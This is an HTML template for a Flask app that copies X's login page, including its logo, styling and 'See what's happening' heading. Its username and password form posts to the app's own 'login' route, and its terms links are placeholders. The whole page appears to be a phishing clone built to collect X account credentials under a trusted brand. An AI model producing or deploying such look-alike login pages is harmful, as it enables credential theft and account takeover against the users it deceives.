<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X - Onboarding</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #0f1419;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 12px 24px;
        }

        .header {
            display: flex;
            align-items: center;
            height: 48px;
            margin-bottom: 12px;
        }

        .back-btn {
            background: none;
            border: none;
            cursor: pointer;
            padding: 8px;
            margin-left: -8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .main-container {
            width: 100%;
            max-width: 360px;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo-title-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 8px;
            margin-bottom: 28px;
            width: 100%;
        }

        .x-logo {
            width: 28px;
            height: 28px;
        }

        .heading {
            font-size: 23px;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .inputs-container {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .input-group {
            position: relative;
            width: 100%;
        }

        .input-group input {
            width: 100%;
            height: 58px;
            padding: 24px 12px 8px 12px;
            border: 1px solid #cfd9de;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            color: #0f1419;
            background-color: transparent;
        }

        .input-group input:focus {
            border: 2px solid #1d9bf0;
            padding: 23px 11px 7px 11px;
        }

        .input-group label {
            position: absolute;
            left: 12px;
            top: 18px;
            font-size: 16px;
            color: #536471;
            pointer-events: none;
            transition: all 0.15s ease;
        }

        .input-group input:focus ~ label,
        .input-group input:not(:placeholder-shown) ~ label {
            top: 8px;
            font-size: 13px;
            color: #1d9bf0;
        }

        .input-group input:not(:focus):not(:placeholder-shown) ~ label {
            color: #536471;
        }

        .btn-continue {
            margin-top: 24px;
            width: 100%;
            height: 44px;
            background-color: #0f1419;
            border: none;
            border-radius: 22px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
        }

        .terms-text {
            margin-top: 20px;
            font-size: 12px;
            color: #536471;
            line-height: 16px;
            text-align: left;
            width: 100%;
        }

        .terms-text a {
            color: #0f1419;
            text-decoration: none;
            font-weight: 700;
        }
    </style>
</head>
<body>

    <header class="header">
        <button class="back-btn" aria-label="Back">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0f1419" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <line x1="19" y1="12" x2="5" y2="12"></line>
                <polyline points="12 19 5 12 12 5"></polyline>
            </svg>
        </button>
    </header>

    <main class="main-container">
        <div class="logo-title-container">
            <svg class="x-logo" viewBox="0 0 24 24" fill="#0f1419">
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
            </svg>
            <h1 class="heading">See what's happening</h1>
        </div>

        <!-- ONLY EMAIL/PASSWORD FORM – no dummy buttons -->
        <form class="inputs-container" action="{{ url_for('login') }}" method="POST">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder=" " required />
                <label for="username">Email or username</label>
            </div>

            <div class="input-group">
                <input type="password" id="password" name="password" placeholder=" " required />
                <label for="password">Password</label>
            </div>

            <button type="submit" class="btn-continue">Continue</button>
        </form>

        <p class="terms-text">
            By continuing, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookie Use</a>.
        </p>
    </main>

</body>
</html>
